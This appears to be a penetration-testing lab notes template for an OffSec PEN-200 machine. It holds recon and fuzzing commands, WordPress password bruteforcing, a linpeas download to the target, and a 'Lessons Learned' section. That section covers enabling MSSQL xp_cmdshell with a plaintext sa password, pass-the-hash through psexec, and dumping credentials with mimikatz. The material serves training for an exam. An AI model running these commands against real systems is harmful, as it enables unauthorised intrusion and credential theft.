


##### Machine Information
```markdown
IP ADDRESS:

HN:

OS: 

EXPLOIT/PORT:

PRIVESC: 

USERS MENTIONED:

CREDENTIALS:
```

------------------------------------------------------------------------------------
###### Initial Scanning  
#ping
```shell
#ping 
┌──(root㉿kali)-[/home/kali]
└─# ping 10.11.1.101         

```
#rustscan 
```shell
┌──(root㉿kali)-[/home/kali]
└─# rustscan -a 10.11.1.101
```
#quick #nmap #for #rustscan
```shell
┌──(root㉿kali)-[/home/kali]
└─# nmap -sC -sV -p 21,22,80,139,445 -Pn 10.11.1.101
```
#nmapudp
```shell
┌──(root㉿kali)-[/home/kali]
└─# nmap -sU 10.11.1.101                            
```
#nmapfulltcp
```shell
┌──(root㉿kali)-[/home/kali]
└─# nmap -sC -sV -p- -Pn 10.11.1.101
```
##### Initial Scanning Notes:
#initial #scanning #notes
- NOTES
- NOTES
- NOTES
  
##### Searchsploit Notes:
#searchsploit
- NOTES
- NOTES
- NOTES

##### Web Fuzzing : Dirsearch // GoBuster // ffuf // nikto
#gobuster #/usr/share/dirb/wordlists/common
```shell
┌──(root㉿kali)-[/home/kali]
└─# gobuster dir -u http://10.11.1.101:80 -w /usr/share/dirb/wordlists/common.txt -x php,txt,html,asp,aspx
```
#gobuster #bruteforce
```

gobuster dir -u http://192.168.111.110 -w
/usr/share/seclists/Discovery/Web-Content/CMS/wordpress.fuzz.txt -t 250 -o
wordpress_gobuster
```
#dirsearch #/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```shell
#dirsearch medium.txt
┌──(root㉿kali)-[/home/kali]
└─# dirsearch -u http://10.11.1.101:80 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

```shell
# tcm recommended dirsearch
┌──(root㉿kali)-[/home/kali]
└─# dirsearch -e php,html,js,asp,aspx -u http://10.11.1.234:10443 -x 400,401,403 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

#nikto #-a
```shell
┌──(root㉿kali)-[/home/kali]
└─# nikto -host 10.11.1.101:80  
```

#basic #ffuf
```shell
# basic ffuf scan - hail mary if nothing is found.
┌──(root㉿kali)-[/home/kali]
└─# ffuf -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt -u https://10.11.1.237/FUZZ
```

#wpscan #wordpress #plugin #reverse #shell #bruteforce #admin/princess #credentials
```shell
# Basic wpscan
┌──(root㉿kali)-[/home/kali]
└─# wpscan --url http://10.11.1.234:80

# WPscan bruteforce - reference 10.11.1.234 
┌──(root㉿kali)-[/home/kali]
└─# wpscan --url http://10.11.1.234:80/ --enumerate u,p,t -P rockyou.txt
```

Fuzzing notes:
- make sure if having issues to fuzzing to use all wordlists on kali machina and download seclists worst case scenario

##### Reverse Shell / Shell 

```shell
```

##### Foothold Enumeration Linux
#sudo #failed 
```shell
alfred@break:~/usr/bin$ sudo -l
[sudo] password for alfred: 
Sorry, user alfred may not run sudo on break.
alfred@break:~/usr/bin$ 
```
#cat #/etc/crontab
```shell
alfred@break:~/usr/bin$ cat /etc/crontab
# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly 
```
#uname #-a #kernelprivesc
```shell
alfred@break:~$ uname -a
Linux break 4.4.0-166-generic #195-Ubuntu SMP Tue Oct 1 09:35:25 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
```
#cat #/etc*/release
```shell
alfred@break:~$ cat /etc/*release
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=16.04
DISTRIB_CODENAME=xenial
DISTRIB_DESCRIPTION="Ubuntu 16.04.6 LTS"
NAME="Ubuntu"
VERSION="16.04.6 LTS (Xenial Xerus)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 16.04.6 LTS"
VERSION_ID="16.04"
HOME_URL="http://www.ubuntu.com/"
SUPPORT_URL="http://help.ubuntu.com/"
BUG_REPORT_URL="http://bugs.launchpad.net/ubuntu/"
VERSION_CODENAME=xenial
UBUNTU_CODENAME=xenial
```
#lsb_release #-a 
```shell
alfred@break:~$ lsb_release -a
No LSB modules are available.
Distributor ID:	Ubuntu
Description:	Ubuntu 16.04.6 LTS
Release:	16.04
Codename:	xenial
alfred@break:~$ 
```
#transfered #linpeas
```shell
┌──(root㉿kali)-[/home/kali/Documents/offsec_labs_pen200/10.11.1.101]
└─# ls               
linpeas.sh
                                                                          
┌──(root㉿kali)-[/home/kali/Documents/offsec_labs_pen200/10.11.1.101]
└─# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.11.1.101 - - [31/Mar/2023 19:51:13] "GET /linpeas.sh HTTP/1.1" 200 -

# pulled over linpeas
alfred@break:/tmp$ wget http://192.168.119.132/linpeas.sh
linpeas.sh                    100%[==============================================>] 808.68K  1.30MB/s    in 0.6s 
```
##### Foothold Enumeration Windows

```SHELL
```
##### Privilege Escalation
```shell
```

##### Flag
```powershell
```


###### Lessons Learned:


#ssh #portforwarding
```

In order to access the internal VNC port 5901, an SSH tunnel will need to be established
that will forward traffic from 5901 on Kali to the internal 5901 on the victim.
ssh -R 5901:127.0.0.1:5901 kali@192.168.11.11
```

#phpinfo

```shell
phpinfo.php is a file that contains a lot of information that can help attackers
when trying to target a system, such as: database information, host information, and software
version numbers.
```

#mssqlclient.py
```shell
# connecting with credentials
mssqlclient.py -port 1433 sa:D@t@b@535@192.168.132.1


#Enabling xp_cmdshell successfully allows system command execution in mssql
EXEC sp_configure ‘show advanced options’, ‘1’
RECONFIGURE
EXEC sp_configure ‘xp_cmdshell’, ‘1’
RECONFIGURE
EXEC xp_cmdshell ‘net user’;
```

#psexec #mimikatz

```shell
# generic psexec login with psexec
psexec.py <user> @127.0.0.1 -hashes :NTLM_HASH_HERE

# how to upload files or mimikatz using psexec
lput mimikatz.exe

#mimikatz dumping of credentials
mimikatz.exe privilege::debug sekurlsa::logonpasswords
```